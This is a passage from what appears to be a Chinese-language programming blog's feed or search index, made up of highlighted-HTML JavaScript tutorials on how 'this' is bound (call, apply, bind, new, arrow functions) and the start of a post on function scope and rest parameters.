<span class="token punctuation">(</span><span class="token boolean">false</span> <span class="token operator">||</span> obj<span class="token punctuation">.</span>foo<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// this.objName为undefined</span>
<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> obj<span class="token punctuation">.</span>foo<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// this.objName为undefined</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="4-对象的方法函数作为其他函数的参数传递（相当于默认绑定中的独立调用）"><a href="#4-对象的方法函数作为其他函数的参数传递（相当于默认绑定中的独立调用）" class="headerlink" title="4.对象的方法函数作为其他函数的参数传递（相当于默认绑定中的独立调用）"></a>4.对象的方法函数作为其他函数的参数传递（相当于默认绑定中的独立调用）</h4><p>不论对象的方法函数是作为内置函数还是声明函数的参数，都会隐式丢失。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>objName<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">function</span> <span class="token function">bar</span><span class="token punctuation">(</span><span class="token parameter">fn</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    objName<span class="token operator">:</span> <span class="token string">"obj"</span><span class="token punctuation">,</span>
    foo<span class="token operator">:</span> foo<span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token function">bar</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span>foo<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// this.objName为undefined</span>
<span class="token function">setTimeout</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span>foo<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// this.objName为undefined</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="三、this的显式绑定"><a href="#三、this的显式绑定" class="headerlink" title="三、this的显式绑定"></a>三、this的显式绑定</h2><h3 id="非永久绑定：call、apply"><a href="#非永久绑定：call、apply" class="headerlink" title="非永久绑定：call、apply"></a>非永久绑定：call、apply</h3><p>fn.call(obj, arg1, arg2, …argn) 被调用的参数依次给出<br>fn.apply(obj, [arg1, arg2, …argn]) 被调用的参数以数组的形式给出<br>call、apply作用：</p>
<ol>
<li>即刻调用函数fn</li>
<li>调用函数fn时，函数fn的this绑定到obj<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>objName<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    objName<span class="token operator">:</span> <span class="token string">"obj"</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token function">foo</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// obj</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="永久绑定：硬绑定、bind"><a href="#永久绑定：硬绑定、bind" class="headerlink" title="永久绑定：硬绑定、bind"></a>永久绑定：硬绑定、bind</h3>硬绑定：在call或apply函数外包装一个函数，使用时直接调用外层函数，以达到永久绑定的效果。<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>objName<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    objName<span class="token operator">:</span> <span class="token string">"obj"</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function">bar</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">foo</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token function">bar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// obj</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
bind方法：返回一个指定了执行上下文的新函数，且新函数能接收参数，bind方法中的参数也会被永久固定。</li>
</ol>
<p>用bind方法代替硬绑定</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>objName<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    objName<span class="token operator">:</span> <span class="token string">"obj"</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">const</span> bar <span class="token operator">=</span> <span class="token function">foo</span><span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">bar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// obj</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>bind方法固定参数</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token parameter">num1<span class="token punctuation">,</span> num2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>num <span class="token operator">+</span> num1 <span class="token operator">+</span> num2<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    num<span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> bar1 <span class="token operator">=</span> <span class="token function">foo</span><span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">bar1</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 6 只绑定了对象，参数可自行指定</span>
<span class="token keyword">const</span> bar2 <span class="token operator">=</span> <span class="token function">foo</span><span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">bar2</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 4 绑定了一个参数，剩余一个参数可自行指定</span>
<span class="token keyword">const</span> bar3 <span class="token operator">=</span> <span class="token function">foo</span><span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">bar3</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 3 绑定了两个参数，自行指定参数无效</span>
<span class="token keyword">const</span> bar4 <span class="token operator">=</span> <span class="token function">foo</span><span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">bar4</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 3 多余绑定的一个参数被丢弃，只有两个参数生效,自行指定参数无效</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>非严格模式下使用call、apply、bind方法时，传入null、undefined作为第一个参数，this会被转换为全局对象（window或global）。<br>严格模式下传入null为null，传入undefined为undefined</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">function</span> <span class="token function">bar</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token string">"use strict"</span><span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    objName<span class="token operator">:</span> <span class="token string">"obj"</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> foo1 <span class="token operator">=</span> <span class="token function">foo</span><span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">foo1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// obj对象</span>
<span class="token keyword">const</span> foo2 <span class="token operator">=</span> <span class="token function">foo</span><span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">foo2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// window对象</span>
<span class="token keyword">const</span> bar1 <span class="token operator">=</span> <span class="token function">bar</span><span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">bar1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// null</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="四、this的new绑定"><a href="#四、this的new绑定" class="headerlink" title="四、this的new绑定"></a>四、this的new绑定</h2><p>当一个函数用作构造函数时，this指向新构造的对象。</p>
<p>虽然构造器默认返回this指向的新对象，但是也可以手动返回其他对象（如果返回值不是一个对象，则返回this指向的新对象）。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">foo1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>objName <span class="token operator">=</span> <span class="token string">"obj1"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">function</span> <span class="token function">foo2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>objName <span class="token operator">=</span> <span class="token string">"obj2"</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span><span class="token punctuation">;</span> <span class="token comment">// 返回空或非对象值，返回this指向的新对象</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">function</span> <span class="token function">foo3</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>objName <span class="token operator">=</span> <span class="token string">"obj3"</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span>objName<span class="token operator">:</span> <span class="token string">"obj4"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">const</span> bar1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">foo1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> bar2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">foo2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> bar3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">foo3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>bar1<span class="token punctuation">,</span> bar2<span class="token punctuation">,</span> bar3<span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token comment">// &#123;objName: "obj1"&#125;, &#123;objName: "obj2"&#125;, &#123;objName: "obj4"&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="this四种绑定的优先级"><a href="#this四种绑定的优先级" class="headerlink" title="this四种绑定的优先级"></a>this四种绑定的优先级</h1><p>new&gt;显式&gt;隐式&gt;默认</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token parameter">Name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>Name<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>objName <span class="token operator">=</span> Name<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>objName<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">const</span> obj1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    objName<span class="token operator">:</span> <span class="token string">"obj1"</span><span class="token punctuation">,</span>
    foo<span class="token operator">:</span> foo<span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> obj2 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    objName<span class="token operator">:</span> <span class="token string">"obj2"</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
obj1<span class="token punctuation">.</span><span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// obj1 隐式绑定优先于默认绑定</span>
obj1<span class="token punctuation">.</span><span class="token function">foo</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>obj2<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// obj2 显式绑定优先于隐式绑定</span>
<span class="token keyword">const</span> bar <span class="token operator">=</span> obj1<span class="token punctuation">.</span><span class="token function">foo</span><span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span>obj2<span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token keyword">const</span> bar1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">bar</span><span class="token punctuation">(</span><span class="token string">"bar1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// bar1 new绑定优先于显式绑定</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="ES6中箭头函数的this绑定（静态作用域，静态绑定，绑定定义时的对象）"><a href="#ES6中箭头函数的this绑定（静态作用域，静态绑定，绑定定义时的对象）" class="headerlink" title="ES6中箭头函数的this绑定（静态作用域，静态绑定，绑定定义时的对象）"></a>ES6中箭头函数的this绑定（静态作用域，静态绑定，绑定定义时的对象）</h1><p>箭头函数简化语法方式：</p>
<ol>
<li>可以省略function这个单词</li>
<li>如果函数只有一个参数，则可以省略圆括号（没有参数和多个参数时不能省略）</li>
<li>如果函数体是一个表达式，则可以省略花括号和返回语句<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token function-variable function">fn1</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token string">"hello world!"</span><span class="token punctuation">;</span>
<span class="token comment">// 等价于 const fn1 = function () &#123;return "hello world!";&#125;</span>
<span class="token keyword">const</span> <span class="token function-variable function">fn2</span> <span class="token operator">=</span> <span class="token parameter">name</span> <span class="token operator">=></span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Hello </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>name<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">!</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
<span class="token comment">// 等价于 const fn2 = function (name) &#123;return `Hello $&#123;name&#125;`;&#125;</span>
<span class="token keyword">const</span> <span class="token function-variable function">fn3</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token operator">=></span> a <span class="token operator">+</span> b<span class="token punctuation">;</span>
<span class="token comment">// 等价于 const fn3 = function (a, b) &#123;return a + b;&#125;</span>
<span class="token keyword">const</span> <span class="token function-variable function">fn4</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">(</span><span class="token punctuation">&#123;</span>a<span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span> b<span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token comment">// 如果返回值是一个对象，应加一层圆括号，因为js会将对象的花括号当作代码块的花括号</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
箭头函数中this遵循词法作用域（静态作用域），会继承外层函数的this绑定，且无法通过显式绑定来修改绑定的对象。<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>objName<span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">&#125;</span>
<span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    objName<span class="token operator">:</span> <span class="token string">"obj"</span><span class="token punctuation">,</span>
    foo<span class="token operator">:</span> foo<span class="token punctuation">,</span> <span class="token comment">// 这里foo函数的this先通过动态的隐式绑定绑定到了obj上，foo中的箭头函数又通过词法作用域的静态绑定继承了foo中隐式绑定到obj的this。</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> bar <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">bar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// obj</span>
<span class="token function">bar</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>objName<span class="token operator">:</span> <span class="token string">"haha"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 显式绑定无效，还是obj</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
</ol>
<p><strong>箭头函数本身没有this、arguments等变量，它的this与arguments都继承于父作用域。箭头函数不能当对象构造器，即不能使用new。指定的参数变量argument在箭头函数中无效，获取剩余参数应使用…rest方法。</strong><br>常见错误是在对象中直接使用箭头函数，因为对象本身不构成作用域，所以对象中直接使用的箭头函数在对象中继承不到this，继续向上到达全局，故this没有指向obj而指向了window。故一般使用箭头函数时应该在外部嵌套一层普通函数。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    objName<span class="token operator">:</span> <span class="token string">"obj"</span><span class="token punctuation">,</span>
    <span class="token function-variable function">foo</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
obj<span class="token punctuation">.</span><span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 结果为window而不是obj</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
      <tags>
        <tag>this</tag>
      </tags>
  </entry>
  <entry>
    <title>javascript函数</title>
    <url>/2018/03/14/javascript%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<h3 id="函数中的参数、非参数、全局、局部变量作用域问题"><a href="#函数中的参数、非参数、全局、局部变量作用域问题" class="headerlink" title="函数中的参数、非参数、全局、局部变量作用域问题"></a>函数中的参数、非参数、全局、局部变量作用域问题</h3><ol>
<li>给函数的参数赋值或在函数中声明与外部相同的变量都不影响外部的变量；</li>
<li>若在函数中，对非声明变量或非参数变量赋值，即对全局变量赋值，会改变外部的全局变量。</li>
</ol>
<p>即函数的参数与函数中声明的变量都是在函数的内部作用域中，不影响全局作用域。</p>
<span id="more"></span>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> a <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> b <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> c <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function">foo</span> <span class="token punctuation">(</span><span class="token parameter">b</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> a <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
    b <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>
    c <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">In foo a = </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>a<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">, b = </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>b<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">, c = </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>c<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">In global a = </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>a<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">, b = </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>b<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">, c = </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>c<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// In foo a = 3, b = 4, c = 5</span>
<span class="token comment">// In global a = 0, b = 1, c = 5</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="javascript中基本类型是对原始值的复制，对象是引用型，被赋值的变量和原变量都是对同一对象的引用。复制型会占用更多的内存，不同变量虽然是相同的值，但使用了不同的内存地址。引用型，不同的变量引用相同内存地址的相同对象。"><a href="#javascript中基本类型是对原始值的复制，对象是引用型，被赋值的变量和原变量都是对同一对象的引用。复制型会占用更多的内存，不同变量虽然是相同的值，但使用了不同的内存地址。引用型，不同的变量引用相同内存地址的相同对象。" class="headerlink" title="javascript中基本类型是对原始值的复制，对象是引用型，被赋值的变量和原变量都是对同一对象的引用。复制型会占用更多的内存，不同变量虽然是相同的值，但使用了不同的内存地址。引用型，不同的变量引用相同内存地址的相同对象。"></a>javascript中基本类型是对原始值的复制，对象是引用型，被赋值的变量和原变量都是对同一对象的引用。复制型会占用更多的内存，不同变量虽然是相同的值，但使用了不同的内存地址。引用型，不同的变量引用相同内存地址的相同对象。</h4><h4 id="可以使用任意多个参数去调用任何一个函数，如果调用时没有传入参数，函数就会接收到一个undefined参数。"><a href="#可以使用任意多个参数去调用任何一个函数，如果调用时没有传入参数，函数就会接收到一个undefined参数。" class="headerlink" title="可以使用任意多个参数去调用任何一个函数，如果调用时没有传入参数，函数就会接收到一个undefined参数。"></a>可以使用任意多个参数去调用任何一个函数，如果调用时没有传入参数，函数就会接收到一个undefined参数。</h4><h4 id="ES6：在函数定义中使用展开操作符“…”，展开操作符之后必需为最后一个参数。展开操作符会收集多余的参数，并将多余参数放入以展开操作符后的参数命名的数组中。"><a href="#ES6：在函数定义中使用展开操作符“…”，展开操作符之后必需为最后一个参数。展开操作符会收集多余的参数，并将多余参数放入以展开操作符后的参数命名的数组中。" class="headerlink" title="ES6：在函数定义中使用展开操作符“…”，展开操作符之后必需为最后一个参数。展开操作符会收集多余的参数，并将多余参数放入以展开操作符后的参数命名的数组中。"></a>ES6：在函数定义中使用展开操作符“…”，展开操作符之后必需为最后一个参数。展开操作符会收集多余的参数，并将多余参数放入以展开操作符后的参数命名的数组中。</h4><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">addPrefix</span><span class="token punctuation">(</span><span class="token parameter">prefix<span class="token punctuation">,</span> <span class="token operator">...</span>words</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">const</span> prefixedWords <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> words<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        prefixedWords<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>prefix <span class="token operator">+</span> words<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> prefixedWords<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
